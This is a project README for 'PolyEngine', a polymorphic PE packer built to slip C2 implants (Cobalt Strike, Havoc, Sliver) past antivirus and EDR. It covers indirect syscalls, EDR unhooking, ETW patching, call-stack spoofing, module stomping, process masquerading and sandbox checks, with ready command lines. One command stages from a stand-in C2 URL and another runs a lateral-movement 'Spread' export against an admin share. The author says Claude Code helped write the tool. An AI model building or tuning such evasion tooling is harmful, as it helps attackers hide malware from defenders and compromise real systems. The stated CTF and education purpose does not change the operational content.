# PolyEngine — Polymorphic PE Packer 📦

**PolyEngine** is a research-grade, evasive PE packer designed for CTF challenges and low-level Windows security education. It focuses on bypassing EDR and AV heuristics through a layered stack of in-memory execution and obfuscation techniques.

This is a side project I've been working on for some time. I have used Claude Code to implement and correct some of techniques I wanted to implement in my own PE packer. There's a lot of comments on functions and what they do, since it was a big learning experience for me and Claude does this flawlessly (I'm bad at it). I hope it helps some people to learn some Windows internals or with bypassing some AVs and static detections from more advanced solutions when you tackle those ProLabs 🏯. 

🔥 Big thank you to [MalDevAcademy](https://maldevacademy.com/) for all the materials to create it and inspiration.

🌩 Thanks to [vx-underground](https://x.com/vxunderground) for inspiration via some goofy tweet with silly cat.

> **Disclaimer:** This tool is intended exclusively for authorized security testing, CTF competitions and educational use. Usage against systems without explicit permission is prohibited. The author assumes no liability for misuse.

---

## Usage

Build order: **Stub first, then Builder** (Builder embeds `stub.bin` into `.rsrc`).

Ensure `stub.bin` is in the same directory as `Builder.exe`.

```
Builder.exe <input> <output> [OPTIONS]

  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)
            Payload type is auto-detected from the MZ header - no flag needed.
  <output>  Output executable

Loader:
  --stub <path>              Path to stub.bin  [default: ./stub.bin]
  --preset PRINT|MEDIA|NETWORK|RANDOM
                             Module stomping DLL preset  [default: PRINT]
  --overload                 Module overloading instead of stomping
                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)
  --keep-alive               ExitThread(0) instead of ExitProcess
                             (required for C2 implants that spawn their own threads)
  --unhook                   Restore original .text bytes in ntdll/kernel32/
                             kernelbase from \KnownDlls\ clean copies
                             (overwrites EDR inline hooks before any payload syscall)

Payload  (PE/DLL only, silently ignored for shellcode):
  --export <name>            DLL export to invoke after DllMain
  --arg <string>             Argument passed to the export  [max 127 chars]

Evasion  (all ON by default):
  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]
                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe
                                   SearchIndexer.exe taskhostw.exe spoolsv.exe
                                   wlrmdr.exe WMPDMC.exe hvix64.exe
  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]
                             (max 31 chars)
  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]
                             Detection threshold: 90% of <ms> elapsed
  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]
  --hammer-s <seconds>       API-hammer delay duration  [default: 3]
  --disable <token,token...>  Disable one or more features (comma-separated, repeatable)

  OPSEC tokens:
    etw         EtwEventWrite patch (ETW telemetry suppression)
    spoofing    Call-stack spoofing (SilentMoonwalk RSP pivot)
    peb         PEB path/cmdline spoof
    tls         TLS anti-debug callback (patches stub.bin before embedding)

  Sandbox/debug check tokens:
    hammer      API-hammer timing delay (VirtualAlloc/Free loop)
    debugger    Debugger detection (PEB flags / NtQueryInformationProcess)
    api-emu     API emulation probe (RtlComputeCrc32 identity check)
    exec-ctrl   Execution-control semaphore (re-execution detection)
    sleep-fwd   Sleep-forwarding detection (timing)
    uptime      System uptime check
    cpu         CPU count check (< 2 logical cores)
    screen      Screen resolution check (<= 1024 px width)
    files       Recent-files count check (< 5 RecentDocs subkeys)
    all         Disable every token listed above

Examples:
  Builder.exe implant.exe     packed.exe
  Builder.exe shellcode.bin   packed.exe --keep-alive
  Builder.exe beacon.dll      packed.exe --export Start --keep-alive
  Builder.exe payload.dll     packed.exe --export Execute --arg "calc.exe"
  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls
  Builder.exe implant.exe     packed.exe --overload --hammer-s 5 --uptime-min 5
  Builder.exe implant.exe     packed.exe --exec-ctrl-name MyMutex --sleep-fwd-ms 1000
```

---

## Examples

Worked examples grouped by scenario. Every flag is opt-out (evasion is fully ON by default), so the simplest invocation already gets the full stack.

<details>
<summary><b>Basic packing - EXE / DLL / shellcode</b></summary>

Pack an unmanaged EXE. Builder auto-detects the `MZ` header and routes through the RunPE path:
```
Builder.exe implant.exe packed.exe
```

Pack raw position-independent shellcode (Cobalt Strike `.bin`, msfvenom `-f raw`, etc.). No `MZ` → direct call into the decompressed buffer:
```
Builder.exe beacon.bin packed.exe
```

Pack a DLL and call its default `DllMain` only (no export):
```
Builder.exe payload.dll packed.exe
```

Use a stub from a non-default location:
```
Builder.exe implant.exe packed.exe --stub C:\build\release\stub.bin
```

</details>

<details>
<summary><b>DLL payloads with exports - Havoc / Sliver / custom beacons</b></summary>

Call a named export after `DllMain` returns. Most C2 implants ship as a DLL with a single entry export (e.g. Havoc Demon: `Start`, Sliver: `RunSliver`):
```
Builder.exe demon.dll packed.exe --export Start --keep-alive
```

Pass a string argument to the export (max 127 chars). Useful for payloads that take a config string, URL, or shell command:
```
Builder.exe runner.dll packed.exe --export Execute --arg "https://c2.example.com/stage"
Builder.exe loader.dll packed.exe --export Run --arg "C:\\Windows\\System32\\calc.exe"
```

`--keep-alive` is required for any payload that spawns its own threads - without it the loader calls `ExitProcess` and kills the beacon.

</details>

<details>
<summary><b>Long-running implants (C2 beacons)</b></summary>

Cobalt Strike / Sliver / Havoc all spawn a beacon thread and return. The loader thread must terminate without taking the process down:
```
Builder.exe beacon.exe   packed.exe --keep-alive
Builder.exe beacon.bin   packed.exe --keep-alive
Builder.exe demon.dll    packed.exe --export Start --keep-alive
```

</details>

<details>
<summary><b>Module stomping presets - picking a host DLL</b></summary>

The decryptor stub is hidden inside the `.text` section of a benign Windows DLL. Pick the preset whose loaded modules look most legitimate for the target context:
```
Builder.exe implant.exe packed.exe --preset PRINT
Builder.exe implant.exe packed.exe --preset MEDIA
Builder.exe implant.exe packed.exe --preset NETWORK
Builder.exe implant.exe packed.exe --preset RANDOM
```

`PRINT` (default) - `xpsservices.dll`, `msi.dll`, `dbghelp.dll`. Common across most workstations.
`NETWORK` - `winhttp.dll`, `wtsapi32.dll`, `wlanapi.dll`. Fits a payload that already needs network APIs loaded.
`RANDOM` - three random indices from the full pool (including `bcrypt.dll`, idx 9).

Switch from `LoadLibraryW` stomping to `NtCreateSection`+`NtMapViewOfSection` overloading (DLL never enters `PEB.Ldr`):
```
Builder.exe implant.exe packed.exe --overload
Builder.exe implant.exe packed.exe --overload --preset NETWORK
```

</details>

<details>
<summary><b>EDR userland unhooking</b></summary>

Restore clean `.text` bytes for `ntdll`, `kernel32`, `kernelbase` from `\KnownDlls\` over any EDR inline hooks. HellsHall already bypasses sensitive `Nt*` hooks; `--unhook` is needed only when the payload itself calls hooked Win32 APIs (e.g. `LoadLibrary`, `CreateProcess`):
```
Builder.exe implant.exe packed.exe --unhook
Builder.exe implant.exe packed.exe --unhook --preset NETWORK --keep-alive
```

</details>

<details>
<summary><b>PEB spoofing - masquerading the process</b></summary>

Override the auto-picked spoof name. Pick something that fits the parent process / launch context (Office macro → `RuntimeBroker.exe` looks weird, `WmiPrvSE.exe` blends in better):
```
Builder.exe implant.exe packed.exe --spoof-name SgrmBroker.exe
Builder.exe implant.exe packed.exe --spoof-name svchost.exe
```

The spoof name is just an ASCII filename - Stub prepends `C:\Windows\System32\` at runtime. Anything not in the default 9-process pool works too.

</details>

<details>
<summary><b>Tuning evasion thresholds</b></summary>

Longer hammer delay against patient sandboxes that run for tens of seconds before judging:
```
Builder.exe implant.exe packed.exe --hammer-s 10
```

Higher uptime threshold - only run if the box has been up for at least 30 minutes (most sandboxes spin a fresh VM per sample):
```
Builder.exe implant.exe packed.exe --uptime-min 30
```

Tighter sleep-forwarding detection (shorter sleep, harder to fast-forward without observable error):
```
Builder.exe implant.exe packed.exe --sleep-fwd-ms 200
```

Custom semaphore name for the exec-control check (avoids clashing with another sample using the default `wuauctl`):
```
Builder.exe implant.exe packed.exe --exec-ctrl-name OneDriveSync
```

Stack everything for a paranoid profile:
```
Builder.exe implant.exe packed.exe --hammer-s 8 --uptime-min 15 --sleep-fwd-ms 250 --exec-ctrl-name TeamsUpdate
```

</details>

<details>
<summary><b>Disabling features for debugging / lab work</b></summary>

When iterating in a debugger, the TLS callback and debugger checks fire immediately. Disable both to attach freely:
```
Builder.exe implant.exe packed.exe --disable tls,debugger
```

Skip every sandbox check (still keeps OPSEC features on - ETW patch, PEB spoof, call-stack spoof):
```
Builder.exe implant.exe packed.exe --disable hammer,debugger,api-emu,exec-ctrl,sleep-fwd,uptime,cpu,screen,files
```

Same thing, shorter:
```
Builder.exe implant.exe packed.exe --disable all
```

Disable specific OPSEC features (e.g. when the target environment doesn't need ETW patching, or PEB spoof breaks a payload that walks its own PEB):
```
Builder.exe implant.exe packed.exe --disable etw
Builder.exe implant.exe packed.exe --disable peb,spoofing
```

`--disable all` only covers sandbox/debug checks. OPSEC tokens (`etw`, `spoofing`, `peb`, `tls`) must be listed explicitly.

</details>

<details>
<summary><b>Realistic combinations</b></summary>

Cobalt Strike beacon DLL, network-themed host, full evasion, custom mutex name:
```
Builder.exe beacon.dll packed.exe --export Start --keep-alive --preset NETWORK --exec-ctrl-name MicrosoftEdgeUpdate
```

Havoc Demon shellcode, overloading instead of stomping, longer hammer delay:
```
Builder.exe demon.bin packed.exe --keep-alive --overload --hammer-s 6
```

Stage-2 EXE for a CTF where you control the trigger and don't need anti-debug:
```
Builder.exe stage2.exe packed.exe --disable all --disable tls,debugger
```

Lateral-movement helper DLL with a path argument:
```
Builder.exe lateral.dll packed.exe --export Spread --arg "\\\\TARGET\\C$\\Users\\Public\\" --keep-alive --unhook
```

</details>

---

## Build

**Visual Studio 2022 (MSVC v143), Release|x64 only.** Open `PolyEngine.sln`.

Build order matters:
1. **Stub** project → produces `x64/Release/stub.bin` (raw binary, no PE headers)
2. **Builder** project → produces `x64/Release/Builder.exe`

`stub.bin` is a raw binary (linker entry point only). Builder reads it from disk and embeds it into the output `.rsrc` section.

MASM custom build steps are configured in `Stub.vcxproj` (`HellsHall.asm`) and in the Engine projects (`DecryptorStub.asm`). No CMake, no Makefile.

**To add a new API hash:** compute `Djb2HashA("ApiName")` (same algorithm as in `ApiHashing.cpp`), add a `g_Hash_*` global in `ApiHashing.h`, initialize it in `ApiHashing_InitHashes()`.

---

## Architecture Overview

Three components implementing a **pack → encrypt → inject** pipeline: **Builder** packs the input PE/shellcode, **Engine** (shared lib) provides crypto/compression/mutation primitives, **Stub** is the runtime executor embedded in the output PE.

<details>
<summary>Detailed pipeline + Stub execution flow</summary>

```
Builder.exe
  ├── reads target PE or raw shellcode (.bin)
  ├── LZNT1 compress
  ├── CompoundEncrypt (inner cipher: XOR+ROL+ADD+XOR, per-build key)
  ├── MutationEngine → unique polymorphic ASM decryptor per build
  ├── CryptGenRandom → per-build XTEA key salt + DLL preset indices
  ├── XTEA-CTR encrypt (outer layer)
  └── embed into stub.bin .rsrc → Output.exe

Output.exe (= stub.bin + .rsrc payload)
  ├── ApiHashing_InitHashes()          — resolve all APIs by Djb2 hash
  ├── GetPayloadFromResource()         — parse .rsrc 280-byte metadata block
  │                                      (before evasion: reads opsecFlags / EVASION_FLAG_NO_* bits)
  ├── Evasion_HammerDelay()            — burn real wall-clock time via VirtualAlloc/Free loop
  ├── Evasion_RunChecks()              — sandbox + debugger detection (8 checks, configurable)
  ├── Syscalls_Init()                  — parse process ntdll exports, FreshyCalls SSN sort, locate `syscall;ret` in .text
  ├── InitNtApi()                      — bind NT API pointers to HellsHall syscall wrappers
  ├── Unhook_RestoreAll()              — (--unhook) overwrite EDR inline hooks with \KnownDlls\ clean bytes
  ├── StackSpoof_Init()                — locate ntdll gadgets, build synthetic stack for RSP-pivot spoof
  ├── Opsec_PatchEtw()                 — patch EtwEventWrite → xor eax,eax; ret (ETW bypass)
  ├── Xtea_DeriveKey(key, salt)        — reconstruct per-build XTEA key
  ├── Xtea_Crypt()                     — decrypt outer XTEA layer
  ├── Opsec_SpoofPeb()                 — mask process name, path, cmdline, debug/heap flags in PEB
  ├── ModuleStomp_Alloc()              — hijack .text section of benign DLL, save original bytes
  │   or ModuleOverload_Alloc()        — (--overload) NtCreateSection+NtMapViewOfSection, not in PEB LDR
  ├── copy decryptor stub → stomped .text (RW), flip RW→RX via HellsHall
  ├── call decryptor (RCX = payload pointer in separate RW buffer) — no RWX ever
  ├── flip stomped .text RX→RW, decompress LZNT1, wipe + restore original .text bytes → RX
  └── RunPE() (PE payload) or NtProtect RW→RX + direct call (shellcode payload)
```

</details>

---

## Evasion Techniques

<details>
<summary><b>Indirect Syscalls — HellsHall</b></summary>

All sensitive NT operations (`NtProtectVirtualMemory`, `NtAllocateVirtualMemory`, etc.) go through indirect syscalls rather than the hooked user-mode stubs in the process ntdll:

1. At startup, `Syscalls_Init()` parses process ntdll's Export Directory and collects every `Zw*` function's RVA into a flat table.
2. SSNs are derived by **RVA-ordering** (HellsGate/FreshyCalls variant): all `Zw*` RVAs are sorted; sorted index == SSN. Hook-agnostic by design — works even if EDR hooks have rewritten function prologues, because hooks don't reorder exports.
3. A `syscall; ret` (`0F 05 C3`) trampoline is located inside process ntdll's `.text` section. The 3-byte sequence is the standard tail of every `Nt*` stub. EDR userland inline hooks target the *entry point* of exported `Nt*` functions (first 5–15 bytes) — never the syscall instruction at the stub's end, because patching the middle of a stub would break its semantics. The bytes at any matching site are therefore unmodified, identical to a clean `\KnownDlls\` mapping, and live in MEM_IMAGE memory backed by `C:\Windows\System32\ntdll.dll` on disk. `g_CleanTrampoline` points there directly — no secondary ntdll mapping, no MEM_PRIVATE copy.
4. All syscalls jump to `g_CleanTrampoline` — EDR hooks at exported Nt* entry points are bypassed. From an ETW kernel-side stack walker's perspective, the leaf frame already lands inside `ntdll.dll` (no "unbacked syscall" IOC).

</details>

<details>
<summary><b>Userland Unhooking — <code>--unhook</code></b></summary>

Optional pass that runs once after `Syscalls_Init()` and before any payload-relevant syscall. For each of `ntdll`, `kernel32`, `kernelbase`:

1. `NtOpenSection(\KnownDlls\<dll>)` + `NtMapViewOfSection` — clean image bytes (same shared section the loader originally mapped from, before any EDR could install hooks).
2. Page-by-page `memcmp` of the live `.text` against the clean copy.
3. Where bytes differ (= EDR inline hook): `NtProtect RX→RW`, `memcpy` clean bytes over the hook, `NtProtect RW→RX`.
4. Unmap and close.

This restores normal `ntdll.dll`/`kernel32.dll`/`kernelbase.dll` semantics for any subsequent Win32 call (PEB walks, `LoadLibrary`, etc.). Skipped when `--unhook` is omitted — HellsHall on its own already bypasses all sensitive `Nt*` hooks, so unhooking is opt-in (it's a heavier action with a small risk of breaking unusual hook layouts).

</details>

<details>
<summary><b>Call Stack Spoofing — SilentMoonwalk RSP Pivot</b></summary>

EDRs monitor the thread call stack at the moment a syscall fires to verify the caller chain looks legitimate. PolyEngine defeats this with a **SilentMoonwalk-style RSP pivot** — no hardware breakpoints, no VEH handler, no exceptions:

1. `StackSpoof_Init()` scans ntdll's `.text` (and any other `IMAGE_SCN_MEM_EXECUTE` section) for two gadgets:
   - **Gadget 1** — `add rsp, imm8; ret` (`48 83 C4 XX C3`) inside a function whose `UNWIND_INFO` advertises a matching `imm8` alloc delta. Constrained to `imm8 < 0x20` so the chain doesn't collide with forwarded stack args.
   - **Gadget 2** — `jmp rbx` (`FF E3`), located in any executable section by raw byte scan, but only accepted if the matching site sits inside a `RUNTIME_FUNCTION` whose `UNWIND_INFO` parses cleanly. The function's `allocDelta` determines where `RtlUserThreadStart` is planted on the synthetic stack, so a gadget without a matching runtime function would break the EDR-visible chain. Jumping into the middle of a longer instruction is fine — the CPU decodes `FF E3` from the gadget address regardless of the preceding byte.
2. A static `g_SpoofSyntheticStack[32]` is laid out so that the trampoline's `ret` walks gadget1 → gadget2 → back to the loader's continuation point, with `RtlUserThreadStart` planted further down as the apparent thread root.
3. Every call to `HellsHallSyscall` (when spoofing is enabled) does `push rbx; lea rbx, AfterJmpPoint; mov [g_SpoofSavedRsp], rsp; lea rsp, g_SpoofSyntheticStack; jmp r11`. The kernel sees an RSP pointing into the synthetic stack, anchored in legitimate ntdll code.
4. Stack-based syscall arguments (5..10) are forwarded from the caller's frame to the synthetic stack at offsets `0x28..0x50` *before* the pivot — without this, the kernel would read gadget addresses as arguments and return `STATUS_ACCESS_VIOLATION`.
5. After the syscall, gadget2's `jmp rbx` lands on `AfterJmpPoint`, which restores RSP from `g_SpoofSavedRsp`, pops `rbx`, and returns to the loader.
6. `StackSpoof_Cleanup()` clears `g_SpoofEnabled` so the payload's own threads see real return addresses.

</details>

<details>
<summary><b>Module Stomping / Module Overloading</b></summary>

Instead of `VirtualAlloc(RWX)`, the polymorphic decryptor executes inside the `.text` section of a legitimately loaded Windows DLL. No RWX memory is ever allocated.

**Stomping (default — `LoadLibraryW`, DLL appears in PEB LDR):**

1. `ModuleStomp_Alloc()` iterates the three DLLs selected by `--preset`. DLL indices are stored in `.rsrc` and resolved from `g_DllPool` at runtime.
2. The first DLL with an executable section large enough for the decryptor stub is chosen.
3. Original `.text` bytes are saved to a private `RW` buffer before touching the section.
4. The decryptor stub (only) is copied into the stomped region. The payload blob stays in a **separate** `RW` allocation (`pEncryptedPayload`).
5. `NtProtect RW → RX`: the stomped region becomes executable. The payload allocation remains `RW` — decryptor receives its address in `RCX` (Windows x64 ABI first argument).
6. Decryptor runs, decrypts `pEncryptedPayload` in-place. `NtProtect RX → RW` immediately after return.
7. Region is wiped, original bytes are restored, section is set back to `PAGE_EXECUTE_READ`.

**Overloading (`--overload` — `NtCreateSection(SEC_IMAGE)` + `NtMapViewOfSection`, NOT in PEB LDR):**

- Same save/restore pattern and no-RWX invariant as stomping.
- DLL is mapped directly from the raw file handle — never appears in `PEB.Ldr`, defeating tools that enumerate loaded modules.
- After use: `NtUnmapViewOfSection` discards COW private pages, removing all evidence of the write.

**Result in both cases:** memory region is `MEM_IMAGE` backed by the DLL's file on disk — memory scanners see a legitimate image mapping, not an anonymous `VirtualAlloc` region.

</details>

<details>
<summary><b>Polymorphic Decryptor — MutationEngine</b></summary>

Each build produces a unique 34-byte x64 ASM decryptor stub, never identical to any prior build:

- **NOP / junk insertion** — random NOP/junk instructions between functional instructions, drawn from a 22-entry pool spanning RBX/R10/R11/R12/R13 (PUSH/POP, XCHG, TEST, MOV self-copy)
- **Register swapping** — functional registers randomly reassigned across equivalent sets
- **Instruction substitution** — each cipher step emitted in one of three semantically equivalent variants (e.g. `xor al, k` / `sub al, ~k+1` / `not al; xor al, ~k`)
- **Loop counter variants** — `inc r9` randomized between `inc r9`, `add r9,1`, `lea r9,[r9+1]`; comparison swapped between `cmp rdx,r9` and `cmp r9,rdx`
- **Block permutation** — 4 independent setup blocks (RCX/RDX/R10/R11 zeroing) reordered via Fisher-Yates shuffle (24 possible orderings)
- **XOR key order swap** — random `xorSwapped` flag flips outer key application order; encryptor + decryptor stay in sync via metadata bit

The CompoundEncrypt cipher (XOR→ROL→ADD→XOR on each byte) maps cleanly to the four-instruction decryptor template. The MutationEngine emits a different variant combination for every step, making static signature matching of the decryptor loop infeasible.

</details>

<details>
<summary><b>Encryption Stack</b></summary>

| Layer | Algorithm | Key source |
|---|---|---|
| Outer | XTEA-CTR (128-bit) | Runtime-derived base XOR per-build `CryptGenRandom` salt |
| Inner | CompoundEncrypt (XOR+ROL+ADD+XOR) | Per-build `__rdtsc`-seeded compound key, embedded in decryptor stub |

**Outer XTEA key derivation** (`Xtea_DeriveKey`): the 128-bit key is built at runtime from arithmetic on irrational-number constants (φ, √2, √3, √5, √10 scaled to 32 bits). All five seed constants are themselves split into `volatile` XOR pairs (`A ^ B`) so no plaintext irrational byte sequence appears in `.rdata` — recovery requires running the derivation. No contiguous 16-byte key blob exists in the binary. The final key is `derived_base XOR key_salt`, where `key_salt` is 16 bytes of `CryptGenRandom` output stored in `.rsrc` — every build produces a unique keystream.

**Dynamic magic (no static YARA anchor):** the `.rsrc` metadata block ends with `magic = key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]`. The Stub locates the block by scanning backwards and verifying this invariant — no `0xDEADBEEF` or other fixed constant exists for a YARA rule to anchor on.

</details>

<details>
<summary><b>TLS Callback Anti-Debug</b></summary>

The Windows Loader invokes TLS callbacks from `.CRT$XLB` **before `AddressOfEntryPoint`** receives control — before any payload is in memory. At that moment the environment is probed with zero external API dependencies (only CPU intrinsics and direct PEB reads):

| Check | PEB / Heap field | Detection condition |
|---|---|---|
| BeingDebugged | `PEB+0x002` | any Win32 debugger attached |
| NtGlobalFlag | `PEB+0xBC` (x64) | bits `0x70` set by ntdll under a debugger |
| Heap Flags | `ProcessHeap+0x70` (x64) | value != 2 (HEAP_GROWABLE) |
| Heap ForceFlags | `ProcessHeap+0x74` (x64) | value != 0 |

On detection: `__fastfail(FAST_FAIL_FATAL_APP_EXIT)` — bypasses all user-mode exception handlers (VEH, SEH, UnhandledExceptionFilter). WER records `STATUS_STACK_BUFFER_OVERRUN (c0000409)`, indistinguishable from a legitimate memory-safety crash.

Can be disabled at build time with `--disable tls`. Builder patches a 5-byte marker in `stub.bin` to neutralize the callback before embedding.

</details>

<details>
<summary><b>ETW Patching</b></summary>

`Opsec_PatchEtw()` writes a 3-byte no-op to the first bytes of `EtwEventWrite` in the process ntdll:

```asm
; After patch:
33 C0    xor eax, eax   ; return STATUS_SUCCESS (0)
C3       ret
```

Applied through `NtProtectVirtualMemory` (via HellsHall + Moonwalk RSP pivot). A separate `pPage` variable holds the base address for `NtProtect` (the kernel may round it to a page boundary); `pEtw` is preserved for the actual byte write.

</details>

<details>
<summary><b>PEB Spoofing</b></summary>

`Opsec_SpoofPeb()` rewrites:
- `PEB.ImageBaseFileName` — process name shown by Process Hacker, etc.
- `PEB.ImagePathName` and `PEB.CommandLine` — full path visible in process listings
- `PEB.BeingDebugged = 0`, `PEB.NtGlobalFlag = 0` — anti-debug flags
- `ProcessHeap.Flags = 2`, `ProcessHeap.ForceFlags = 0` — heap debug flags

The spoof filename is set via `--spoof-name`. If omitted, Builder picks randomly from a pool of 9 common System32 processes (`RuntimeBroker.exe`, `SgrmBroker.exe`, `WmiPrvSE.exe`, `SearchIndexer.exe`, `taskhostw.exe`, `spoolsv.exe`, `wlrmdr.exe`, `WMPDMC.exe`, `hvix64.exe`) using `CryptGenRandom`.

</details>

<details>
<summary><b>Sandbox & Anti-Analysis Checks</b></summary>

`Evasion_RunChecks()` runs before any syscall initialization and uses only the Win32 API layer. Checks are individually toggleable via `--disable`.

**Hard checks** — a single positive triggers immediate exit:

| Check | Method | What it detects |
|---|---|---|
| `debugger` | `PEB.BeingDebugged`, `PEB.NtGlobalFlag`, `ProcessHeap` flags, `NtQueryInformationProcess(ProcessDebugPort)` | Win32 debugger attached |
| `api-emu` | `RtlComputeCrc32(seed, NULL, 0)` — must equal seed | API emulation that returns wrong results |
| `exec-ctrl` | Named semaphore (`wuauctl` by default, configurable) — `ERROR_ALREADY_EXISTS` | Second execution of the sample |
| `sleep-fwd` | `Sleep(ms)` + `GetTickCount64` delta, threshold = 90% of `ms` | Sandbox that fast-forwards `Sleep` calls |

**Soft checks** — 2 or more positives required to exit (reduces false positives):

| Check | Threshold | What it detects |
|---|---|---|
| `uptime` | system uptime < N minutes (default: 2) | Freshly spawned sandbox VM |
| `cpu` | logical processor count < 2 | Low-spec sandbox |
| `screen` | screen width ≤ 1024 px | 800×600 / 1024×768 sandbox resolutions |
| `files` | `HKCU\...\Explorer\RecentDocs` subkey count < 5 | Clean / fake user profile |

**Timing delay:**

`Evasion_HammerDelay()` burns real wall-clock time via `VirtualAlloc/VirtualFree` pairs timed by `GetTickCount64`. The duration is configurable via `--hammer-s` (default: 3 seconds). Sandbox time-accelerators cannot fast-forward allocator round-trips, making this effective against sleep-fast-forward evasion that bypasses the `sleep-fwd` check.

</details>

<details>
<summary><b>API Hashing — Djb2</b></summary>

All Windows API names are replaced at compile time with precomputed Djb2 hashes stored as `g_Hash_*` globals. `GetProcAddressH()` walks the export directory and hashes each exported name until a match is found — no plaintext API string appears in the import table or `.data`.

</details>

---

## .rsrc Metadata Block Layout

Resource ID 101 (`RT_RCDATA`) contains the XTEA-encrypted blob followed by a **280-byte metadata block**. The Stub locates the block by scanning backwards from the end of the resource (up to 128 bytes, tolerating `UpdateResource` alignment padding) and verifying `magic == XOR(key_salt[0..3])`.

<details>
<summary>Field-by-field layout</summary>

```
[XTEA-encrypted blob]
[key_salt        : 16 bytes]  per-build random XTEA salt (4 x DWORD)
[dll_idx0        :  1 byte ]  index into g_DllPool (module stomping target 1)
[dll_idx1        :  1 byte ]  index into g_DllPool (module stomping target 2)
[dll_idx2        :  1 byte ]  index into g_DllPool (module stomping target 3)
[pad             :  1 byte ]  alignment (0x00)
[origSize        :  4 bytes]  original decompressed PE size (ULONG)
[stubSize        :  4 bytes]  mutated ASM decryptor size (DWORD)
[blobSize        :  4 bytes]  XTEA blob size (DWORD)
[exportHash      :  4 bytes]  fixed-seed Djb2 hash of DLL export to invoke; 0 = none
[exportArg       : 128 bytes] null-terminated export argument string (zero-padded)
[spoof_exe       :  64 bytes] ASCII filename for PEB spoof (zero-padded)
[semaphore_name  :  32 bytes] exec-ctrl semaphore name; empty = default "wuauctl" (zero-padded)
[sleep_fwd_ms    :  4 bytes]  sleep-fwd check duration (ms); 0 = default 500
[uptime_min      :  4 bytes]  uptime threshold (minutes); 0 = default 2
[hammer_ms       :  4 bytes]  API-hammer delay (ms); 0 = default 3000
[flags           :  4 bytes]  OPSEC_FLAG_* + EVASION_FLAG_* bitmask
[magic           :  4 bytes]  key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
──────────────────────────────
Total: 280 bytes
```

No fixed value exists anywhere in the block — every field is either random (key_salt, magic) or build-specific. YARA cannot anchor on a static byte sequence.

</details>

---

## Module Stomping DLL Pool

Builder `--preset` selects 3 DLL indices stored in `.rsrc`. Stub resolves names from `g_DllPool` at runtime — no DLL name appears in the payload or metadata.

<details>
<summary>DLL pool table</summary>

| Index | DLL | Group |
|---|---|---|
| 0 | xpsservices.dll | PRINT |
| 1 | msi.dll | PRINT |
| 2 | dbghelp.dll | PRINT |
| 3 | winmm.dll | MEDIA |
| 4 | dxgi.dll | MEDIA |
| 5 | oleaut32.dll | MEDIA |
| 6 | winhttp.dll | NETWORK |
| 7 | wtsapi32.dll | NETWORK |
| 8 | wlanapi.dll | NETWORK |
| 9 | bcrypt.dll | (RANDOM-only) |

Index 9 (`bcrypt.dll`) is reachable only via `--preset RANDOM`; the named presets cover indices 0–8 in groups of three. Builder verifies at build time that at least one of the three selected DLLs has an executable section large enough for the payload blob, and warns if none qualify.

</details>

---

## Project Structure

<details>
<summary>File tree</summary>

```
PolyEngine/
├── Builder/
│   └── Builder.cpp          — CLI parser, orchestration, CryptGenRandom salt/indices
├── Engine/                  — shared between Builder and Stub (compiled into both)
│   ├── Compression.c/h      — LZNT1 compress (Builder) / decompress (Stub) wrappers
│   ├── Crypto.c/h           — CompoundEncrypt inner cipher (XOR+ROL+ADD+XOR)
│   ├── MutationEngine.c/h   — polymorphic ASM decryptor generator
│   ├── NtApi.c/h            — NT API pointer table definitions
│   ├── OpsecFlags.h         — OPSEC_FLAG_* + EVASION_FLAG_* + PAYLOAD_FLAG_* bitmask definitions
│   ├── PeBuilder.c/h        — PAYLOAD_METADATA struct + .rsrc injection (BeginUpdateResource)
│   ├── RunPE.c/h            — in-process PE mapping (IAT fix, relocs, DllMain / EXE EP)
│   └── Xtea.c/h             — XTEA-CTR block cipher + irrational-constant key derivation
└── Stub/                    — CRT-free runtime executor
    ├── Stub.cpp             — EntryPoint, orchestrates all stages
    ├── ApiHashing.cpp/h     — Djb2 hash cache, GetProcAddressH, GetModuleHandleH
    ├── Common.c/h           — custom_memcpy/memset/memcmp (no CRT)
    ├── Evasion.cpp/h        — sandbox + debugger detection (HammerDelay + RunChecks)
    ├── HellsHall.asm        — indirect syscall dispatcher (SetSyscallParams + trampoline jump)
    ├── ModuleStomping.c/h   — g_DllPool[10], ModuleStomp_Alloc, ModuleOverload_Alloc
    ├── Opsec.c/h            — ETW patch, PEB spoofing
    ├── Payload.c/h          — .rsrc parsing, GetPayloadFromResource, DecompressPayload
    ├── StubNtApi.c          — SYSCALL_WRAPPER macro, Sys_Nt* wrappers, InitNtApi
    ├── Structs.h            — NT struct definitions (no Windows DDK dependency)
    ├── Syscalls.c/h         — process ntdll exports parse, RVA-order SSN derivation, `syscall;ret` site lookup in .text
    ├── TlsCallback.c        — pre-EntryPoint anti-debug (PEB/heap flags, __fastfail)
    ├── Unhooker.c/h         — (--unhook) page-by-page restore from \KnownDlls\ over EDR inline hooks
    └── StackSpoof.c/h       — SilentMoonwalk RSP-pivot call stack spoofing
```

</details>

---

## Dependencies

- Windows 10/11 x64 target
- Visual Studio 2022 (MSVC v143) — no external libraries
- Stub: zero CRT dependency (`/NODEFAULTLIB`), no `malloc`/`free`, no `<string.h>`

---

**Maintained by: Razz** | Built for opsec-conscious security research and fun

*Assistance in implementation done with Claude Code*

---

## License

[MIT](LICENSE) — authorized use only. See `LICENSE` for the full disclaimer.
